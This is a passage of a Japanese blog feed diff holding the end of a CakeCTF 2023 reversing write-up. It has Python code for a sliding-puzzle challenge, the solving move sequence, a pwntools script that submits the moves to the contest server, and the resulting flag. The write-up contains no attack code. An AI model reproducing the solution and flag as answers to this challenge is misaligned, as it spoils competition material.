+&lt;span class="n">sorted_puzzle&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sorted_index&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">zip&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nb">sorted&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">zip&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">puzzle&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">index&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">reverse&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;span class="k">return&lt;/span> &lt;span class="n">sorted_index&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sorted_puzzle&lt;/span>
+&lt;span class="k">def&lt;/span> &lt;span class="nf">state_puzzle&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sorted_index&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="n">puzzle&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="n">x&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">x&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)][::&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;span class="n">index&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sorted_puzzle&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">zip&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nb">sorted&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">zip&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sorted_index&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">puzzle&lt;/span>&lt;span class="p">)))&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sorted_puzzle&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">])&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">zfill&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">end&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34; &amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="k">def&lt;/span> &lt;span class="nf">show_slide&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;span class="n">counter&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">64&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="n">counter&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="mi">1&lt;/span>
+&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">M&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">])&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">zfill&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">end&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34; &amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="n">counter&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="k">def&lt;/span> &lt;span class="nf">show_state_slide&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;span class="n">sorted_index&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sorted_puzzle&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">puzzle_index&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;span class="n">state_puzzle&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sorted_index&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="k">def&lt;/span> &lt;span class="nf">slide&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">vec&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="n">vec_list&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">list&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">vec&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="n">v&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">vec_list&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="n">e&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">v&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="n">show_state_slide&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>解いた結果、次のシーケンスでパズルが解けました。&lt;code>q&lt;/code>メソッドから返ってくる値が0になることも確認できました。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">slide&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;RURDDRULLDRULULDRRUULLDRDRRDLLLUURDDLUUURDLURRDDRULDRULLDRRUULLDRDRULLURRDLDRULLURDLLU&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;q = &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">q&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">vagrant@vagrant:~/repo/cakectf2023/rev/cakepuzzle$ python3 main.py
+1146640091 1277362948 0002245791 1729795767
+1817593079 2146722439 1860814889 1557802610
+0000000000 1770948809 0870734415 1355570260
+0323584794 1405652852 0629508793 1928951512
+05 06 01 10
+12 15 13 09
+00 11 04 07
+02 08 03 14
+[2, 0, R]
+&amp;lt;Move&amp;gt;R: 32, 36
+...
+[1, 0, U]
+&amp;lt;Move&amp;gt;U: 16, 0
+00 01 02 03
+04 05 06 07
+08 09 10 11
+12 13 14 15
+q = 0
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>このシーケンスを送るコードを書いて、サーバーに送信するとflagが得られました。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
+&lt;span class="kn">import&lt;/span> &lt;span class="nn">time&lt;/span>
+&lt;span class="n">solver&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;RURDDRULLDRULULDRRUULLDRDRRDLLLUURDDLUUURDLURRDDRULDRULLDRRUULLDRDRULLURRDLDRULLURDLLU&amp;#34;&lt;/span>
+&lt;span class="n">io&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">remote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;others.2023.cakectf.com&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">14001&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">solver&lt;/span>&lt;span class="p">)):&lt;/span>
+&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">solver&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;span class="n">time&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sleep&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">0.1&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendlineafter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">solver&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="s2">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">readline&lt;/span>&lt;span class="p">())&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>よってflagは&lt;code>CakeCTF{wh0_at3_a_missing_pi3c3_0f_a_cak3}&lt;/code>です。&lt;/p>
+&lt;h2 id="終わりに">終わりに&lt;/h2>
+&lt;p>今までの知識を全て活用して問題が解けたときはやはり面白いなと参加して感じました。
+特に、学校の授業で習ったことが活用できた時は、勉強しといてよかったと思うことが多いです。
+自分でも好きなことを勉強して、面白いと感じれる機会を増やしていきたいと思います。&lt;/p>
+&lt;p>最後に、このCakeCTF2023の運営を行っていただいた方々、このような楽しい大会を開催していただきありがとうございました。&lt;/p></description></item><item><title>WaniCTF2023 WriteUp</title><link>https://hiro-1219.github.io/blog/p/wanictf2023-writeup/</link><pubDate>Sat, 06 May 2023 18:00:00 +0900</pubDate><guid>https://hiro-1219.github.io/blog/p/wanictf2023-writeup/</guid><description>&lt;h2 id="はじめに">はじめに&lt;/h2>
 &lt;p>今回、チーム「🍣SUSH1st」のメンバーとして5/4から5/6まで開催されていた大阪大学のCTFクラブであるWani Hackaseが主催しているWaniCTF2023に参加しました。
 私は主にReversingとForensicsを中心にして解いたのでWriteUpをここに残します。&lt;/p>
 &lt;h2 id="reversing">Reversing&lt;/h2>
